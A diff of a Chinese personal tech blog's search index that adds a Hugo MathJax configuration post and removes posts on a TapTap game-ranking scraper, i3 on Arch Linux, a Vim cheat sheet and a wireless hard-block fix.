+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">  <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">async</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title class_">Config</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">tex2jax</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">inlineMath</span>: [[<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;$&#x27;</span>], [<span class="string">&#x27;\\(&#x27;</span>,<span class="string">&#x27;\\)&#x27;</span>]],</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">displayMath</span>: [[<span class="string">&#x27;$$&#x27;</span>,<span class="string">&#x27;$$&#x27;</span>], [<span class="string">&#x27;\[\[&#x27;</span>,<span class="string">&#x27;\]\]&#x27;</span>]],</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">processEscapes</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">processEnvironments</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">skipTags</span>: [<span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;noscript&#x27;</span>, <span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;textarea&#x27;</span>, <span class="string">&#x27;pre&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">TeX</span>: &#123; <span class="attr">equationNumbers</span>: &#123; <span class="attr">autoNumber</span>: <span class="string">&quot;AMS&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">           <span class="attr">extensions</span>: [<span class="string">&quot;AMSmath.js&quot;</span>, <span class="string">&quot;AMSsymbols.js&quot;</span>] &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title class_">Queue</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// Fix &lt;code&gt; tags after MathJax finishes running. This is a</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// hack to overcome a shortcoming of Markdown. Discussion at</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// https://github.com/mojombo/jekyll/issues/199</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> all = <span class="title class_">MathJax</span>.<span class="property">Hub</span>.<span class="title function_">getAllJax</span>(), i;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; all.<span class="property">length</span>; i += <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          all[i].<span class="title class_">SourceElement</span>().<span class="property">parentNode</span>.<span class="property">className</span> += <span class="string">&#x27; has-jax&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">code</span><span class="selector-class">.has-jax</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: inherit;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: inherit;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: inherit;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#515151</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里，把官网的三处修改合并成一个 partial。 此外，还把 MathJax 的 CDN 从<code>cdnjs.cloudflare.com</code>替换成了<code>cdn.bootcss.com</code>，更好地支持国内。 因为个人的一些写作习惯，还替换了区块公式的第二标志，从中括号<code>[]</code>换成双中括号。</p>
+<p>把这个 partial 模板添加到<code>&lt;head&gt;</code>中，即可正常工作。</p>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">&#123;&#123; partial <span class="string">&quot;mathjax.html&quot;</span> . &#125;&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>Hugo</tag>
+        <tag>Mathjax</tag>
       </tags>
   </entry>
   <entry>
@@ -771,160 +925,6 @@
       </categories>
       <tags>
         <tag>RSA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>爬取 TapTap 网站上的游戏排行榜信息</title>
-    <url>/TapTap-Spider.html</url>
-    <content><![CDATA[<blockquote>
-<p>爬虫小项目代码存档</p>
-</blockquote>
-<span id="more"></span>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tapspider</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="variable language_">self</span>.responses = <span class="built_in">list</span>()</span><br><span class="line">            <span class="variable language_">self</span>.datas = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.get_page()</span><br><span class="line">            <span class="variable language_">self</span>.get_game_info()</span><br><span class="line">            <span class="variable language_">self</span>.save_data(<span class="variable language_">self</span>.datas, <span class="string">&#x27;DownloadList&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_datas</span>(<span class="params">self, code</span>):</span><br><span class="line">        base_url = <span class="string">&#x27;http://www.taptap.com/app/&#x27;</span></span><br><span class="line">        url = base_url+code</span><br><span class="line">        html = <span class="variable language_">self</span>.get_game_page(url)</span><br><span class="line">        result = etree.HTML(html)</span><br><span class="line">        test = -<span class="number">1</span></span><br><span class="line">        free = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        installs = -<span class="number">1</span></span><br><span class="line">        pre_reg = -<span class="number">1</span></span><br><span class="line">        purchases = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        game_info = result.xpath(<span class="string">&quot;//div[@class=&#x27;app-data-wrap&#x27;]/p/span/text()&quot;</span>)</span><br><span class="line">        <span class="comment"># print(node)</span></span><br><span class="line">        <span class="comment"># print(type(node))</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(game_info))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(game_info) == <span class="number">1</span>:</span><br><span class="line">            test = <span class="number">1</span></span><br><span class="line">            installs = -<span class="number">1</span></span><br><span class="line">            pre_reg = -<span class="number">1</span></span><br><span class="line">            purchases = -<span class="number">1</span></span><br><span class="line">            followers = <span class="built_in">str</span>(game_info[<span class="number">0</span>]).replace(<span class="string">&#x27; 人关注&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(game_info[<span class="number">0</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">type</span>(game_info[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;购买&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(game_info[<span class="number">0</span>]):</span><br><span class="line">                purchases = <span class="built_in">str</span>(game_info[<span class="number">0</span>]).replace(<span class="string">&#x27; 人购买&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;安装&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(game_info[<span class="number">0</span>]):</span><br><span class="line">                installs = <span class="built_in">str</span>(game_info[<span class="number">0</span>]).replace(<span class="string">&#x27; 人安装&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                free = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;预约&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(game_info[<span class="number">0</span>]):</span><br><span class="line">                pre_reg = <span class="built_in">str</span>(game_info[<span class="number">0</span>]).replace(<span class="string">&#x27; 人预约&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            followers = <span class="built_in">str</span>(game_info[<span class="number">1</span>]).replace(<span class="string">&#x27; 人关注&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> test, free, installs, pre_reg, purchases ,followers</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_game_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> response <span class="keyword">in</span> <span class="variable language_">self</span>.responses:</span><br><span class="line">            html = json.loads(response)[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;html&#x27;</span>]</span><br><span class="line">            results = etree.HTML(html)</span><br><span class="line">            game_list = results.xpath(</span><br><span class="line">                <span class="string">&quot;//div[@class=&#x27;taptap-top-card&#x27;]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">len</span>(game_list))</span><br><span class="line">            response_num = <span class="variable language_">self</span>.responses.index(response)</span><br><span class="line">            <span class="keyword">for</span> game <span class="keyword">in</span> game_list:</span><br><span class="line">                game_num = game_list.index(game)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;正在获取第%d个游戏的信息&#x27;</span> % (response_num*<span class="number">30</span>+game_num+<span class="number">1</span>))</span><br><span class="line">                order = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./span[@class =&#x27;top-card-order-text orange &#x27;]/text() | ./span[@class = &#x27;top-card-order-text  &#x27;]/text() | ./span[@class=&#x27;top-card-order-text  small-font&#x27;]/text()&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">                name = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/a[@class=&#x27;card-middle-title &#x27;]/h4/text()&quot;</span>)[<span class="number">0</span>]).strip().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                developer = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/p[@class=&#x27;card-middle-author&#x27;]/a/text()&quot;</span>)[<span class="number">0</span>]).strip(<span class="string">&#x27;厂商:\xa0&#x27;</span>)</span><br><span class="line">                score = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/div[@class=&#x27;card-middle-score&#x27;]/p/span/text()&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">                description = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/p[@class=&#x27;card-middle-description&#x27;]/text()&quot;</span>)[<span class="number">0</span>]).strip().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                tags = game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/div[@class=&#x27;card-tags&#x27;]/a/text()&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tags)):</span><br><span class="line">                    tags[i] = <span class="built_in">str</span>(tags[i])</span><br><span class="line">                category = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/div[@class=&#x27;card-middle-category&#x27;]/a/text()&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">                game_code = <span class="built_in">str</span>(game.xpath(</span><br><span class="line">                    <span class="string">&quot;./div[@class=&#x27;top-card-middle&#x27;]/a[@class=&#x27;card-middle-title &#x27;]/@href&quot;</span>)[<span class="number">0</span>]).replace(<span class="string">&#x27;https://www.taptap.com/app/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                test, free, installs, pre_reg, purchases ,followers = <span class="variable language_">self</span>.get_datas(game_code)</span><br><span class="line"></span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">&#x27;order&#x27;</span>: order,</span><br><span class="line">                    <span class="string">&#x27;code&#x27;</span>: game_code,</span><br><span class="line">                    <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                    <span class="string">&#x27;developer&#x27;</span>: developer,</span><br><span class="line">                    <span class="string">&#x27;score&#x27;</span>: score,</span><br><span class="line">                    <span class="string">&#x27;description&#x27;</span>: description,</span><br><span class="line">                    <span class="string">&#x27;tags&#x27;</span>: tags,</span><br><span class="line">                    <span class="string">&#x27;category&#x27;</span>: category,</span><br><span class="line">                    <span class="string">&#x27;free&#x27;</span>: free,</span><br><span class="line">                    <span class="string">&#x27;test&#x27;</span>: test,</span><br><span class="line">                    <span class="string">&#x27;followers&#x27;</span>: followers,</span><br><span class="line">                    <span class="string">&#x27;installs&#x27;</span>: installs,</span><br><span class="line">                    <span class="string">&#x27;purchases&#x27;</span>: purchases,</span><br><span class="line">                    <span class="string">&#x27;pre_reg&#x27;</span>: pre_reg</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="variable language_">self</span>.datas.append(data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;共有%d个游戏&#x27;</span> % <span class="built_in">len</span>(<span class="variable language_">self</span>.datas))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">self</span>):</span><br><span class="line">        base_url = <span class="string">&quot;http://www.taptap.com/ajax/top/download?&quot;</span></span><br><span class="line">        <span class="comment"># 1:30, 2:30, 3:90</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            page = <span class="built_in">str</span>(i+<span class="number">1</span>)</span><br><span class="line">            total = <span class="built_in">str</span>((i)*<span class="number">30</span>)</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;page&#x27;</span>: page,</span><br><span class="line">                <span class="string">&#x27;total&#x27;</span>: total</span><br><span class="line">            &#125;</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Usr-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">            response = requests.get(</span><br><span class="line">                base_url, params=params, headers=headers)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正在获取页面内容...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Page:&#x27;</span>, response.url, <span class="string">&#x27;\tstatus code:&#x27;</span>,</span><br><span class="line">                  response.status_code, <span class="string">&#x27;\tlength:&#x27;</span>, <span class="built_in">len</span>(response.text))</span><br><span class="line">            <span class="variable language_">self</span>.responses.append(response.text)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_game_page</span>(<span class="params">self, url</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Usr-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(</span><br><span class="line">            url,  headers=headers)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_data</span>(<span class="params">self,datas, list_type</span>):</span><br><span class="line">        date = time.strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>, time.localtime())</span><br><span class="line">        filename = list_type +date +<span class="string">&#x27;.pkl&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>+filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(datas,f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    spider = Tapspider()</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;用时：&#x27;</span>, end-start)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>spider</tag>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Translate Words in Commandline</title>
-    <url>/Translate-Words-in-Commandline.html</url>
-    <content><![CDATA[<p>为了在 Linux 上方便快捷地查询生词，使用了一个 Python 脚本爬取有道词典上的释义，代码更改自<a href="https://www.jianshu.com/p/2d5bcd87594e">此文章</a><br>可以在命令行中通过以下命令查询单词<br><code>fy &lt;word&gt;</code></p>
-]]></content>
-      <categories>
-        <category>Tools</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Use I3 on Arch Linux</title>
-    <url>/Use-i3-on-Arch-Linux.html</url>
-    <content><![CDATA[<blockquote>
-<p>i3 is a tiling window manager, completely written from scratch. The target platforms are GNU&#x2F;Linux and BSD operating systems, our code is Free and Open Source Software (FOSS) under the BSD license. i3 is primarily targeted at advanced users and developers.</p>
-</blockquote>
-<span id="more"></span>
-
-<h1 id="0x00-i3-的安装与启动"><a href="#0x00-i3-的安装与启动" class="headerlink" title="0x00 i3 的安装与启动"></a>0x00 i3 的安装与启动</h1><p>安装 i3-gaps , i3-gaps 比 i3 有更多特性， 更加美观。</p>
-<p><code>sudo pacman -S i3-gaps</code></p>
-<p>因为我之前使用的桌面是 GNOME，所以可以直接使用 GDM(the GNOME Display Manger) 进行启动， 输入密码之后，在 <code>Sign in</code> 按钮旁边的小齿轮菜单中选择 i3 再登陆即可。</p>
-<p>i3 的配置文件在 ~&#x2F;.config&#x2F;i3&#x2F;config ,可以根据自己的喜好配置快捷键和自启动程序。</p>
-<h1 id="0x01-其他工具"><a href="#0x01-其他工具" class="headerlink" title="0x01 其他工具"></a>0x01 其他工具</h1><ul>
-<li>终端 <code>sakura</code></li>
-<li>状态栏 <code>Polybar</code></li>
-<li>窗口管理器 <code>Compton</code></li>
-<li>程序启动器 <code>rofi</code></li>
-<li>输入法 <code>ibus-libpinyin</code> (因为未知原因无法识别到 fcitx 输入法)</li>
-<li>桌面 <code>feh</code></li>
-<li>命令行网易云音乐 <code>musicbox</code></li>
-<li>蓝牙管理软件 <code>blueman</code></li>
-<li>网络管理软件 <code>nm-applet</code></li>
-<li>浏览器 <code>chromium</code></li>
-<li>文件管理器 <code>ranger</code></li>
-<li>锁屏软件 <code>i3lock-fancy-git</code><sup>AUR<sup></li>
-</ul>
-<p>以上软件大部分都可以直接使用 pacman 包管理工具进行安装。部分软件需要设置自动运行，在 i3 的配置文件中进行修改即可。Polybar 参考<a href="https://github.com/Dimerbone/dotfiles">此配置</a>，具体使用可以查看 Wiki 。</p>
-]]></content>
-      <categories>
-        <category>Tools</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>i3WM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vim Cheat Sheet</title>
-    <url>/Vim-Cheat-Sheet.html</url>
-    <content><![CDATA[<blockquote>
-<p>ref: <a href="http://example.com/">Vim Cheat Sheet</a>.</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="命令模式："><a href="#命令模式：" class="headerlink" title="命令模式："></a>命令模式：</h3><ul>
-<li>i 切换到输入模式，以输入字符。</li>
-<li>x 删除当前光标所在处的字符。</li>
-<li>: 切换到底线命令模式，以在最底一行输入命令</li>
-<li>h 光标向左移动一个字符</li>
-<li>j 光标向下移动一个字符</li>
-<li>k 光标向上移动一个字符</li>
-<li>l 光标向右移动一个字符</li>
-<li>gg 动到这个档案的第一行，相当于 1G</li>
-<li>G 移动到这个档案的最后一行(常用)</li>
-<li>n n 为数字。移动到这个档案的第 n 行</li>
-<li>n<Enter> n 为数字。光标向下移动 n 行</li>
-<li>x 在一行字当中，x 为向后删除一个字符，X 为向前删除一个字符</li>
-<li>nx n 为数字，连续向后删除 n 个字符</li>
-<li>d 删除游标所在的那一整行</li>
-<li>n n 为数字。删除光标所在的向下 n 行</li>
-<li>u 复原前一个动作</li>
-<li>[Ctrl]+r 重做上一个动作</li>
-<li>y 复制游标所在的那一行(常用)</li>
-<li>n n 为数字，复制光标所在的向下 n 行<!-- more --></li>
-</ul>
-<h3 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h3><ul>
-<li>ESC 退出输入模式，切换到命令模式</li>
-<li>HOME&#x2F;END 移动光标到行首&#x2F;行尾</li>
-<li>PageUp&#x2F;PageDown 上&#x2F;下翻页</li>
-<li>Insert 切换光标为输入&#x2F;替换模式，光标将变成竖线&#x2F;下划线</li>
-</ul>
-<h3 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h3></h3><ul>
-<li>:q 退出程序</li>
-<li>:w 保存文件</li>
-<li>:wq 保存并退出</li>
-<li>:q! 存退出</li>
-<li>:w [filename] 将编辑的数据储存成另一个档案（类似另存新档）</li>
-<li>:r [filename] 在编辑的数据中，读入另一个档案的数据</li>
-<li>:n1,n2 w [filenam] 将 n1 到 n2 的内容储存成 filename 这个档案</li>
-<li>:! comman 暂时离开 vi 到指令行模式下执行 command 的显示结果</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Tools</category>
-      </categories>
-      <tags>
-        <tag>Tools</tag>
-        <tag>Vim</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Wireless Interface Hard-Blocked</title>
-    <url>/Wireless-Interface-Hard-Blocked.html</url>
-    <content><![CDATA[<blockquote>
-<p>安装 networkmanager 后执行 <code>$ nmcli dev</code> , 发现无线网卡 wlp3s0 的状态为 unavailable</p>
-</blockquote>
-<span id="more"></span>
-
-<p>执行命令 <code>$ sudo rekill list</code> 发现无线网卡状态为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">soft blocked   no</span><br><span class="line">hard blocked   yes</span><br></pre></td></tr></table></figure>
-
-<h1 id="查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可"><a href="#查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可" class="headerlink" title="查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可"></a>查找资料后发现这是由于硬件开关未打开导致的。但是现在笔记本电脑上并没有网卡开关，因此直接禁用联想的无线模块即可</h1><ul>
-<li><p>在黑名单中加入 ideapad_laptop</p>
-<p><code>$ sudo vim /etc/modprobe.d/ideapad.conf</code></p>
-<p>在第一行加入</p>
-<p><code>blacklist ideapad_laptop</code></p>
-<p>保存并退出</p>
-</li>
-<li><p>执行 <code>$ sudo modprobe -r ideapad_laptop</code></p>
-<p>这时键盘可能会失效，直接按关机键重启即可</p>
-</li>
-<li><p>重启后再次执行 <code>$ rekill list</code> 显示为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">soft blocked   no</span><br><span class="line">hard blocked   no</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>这时就可以使用无线网卡了</p>
-]]></content>
-      <categories>
-        <category>Tools</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
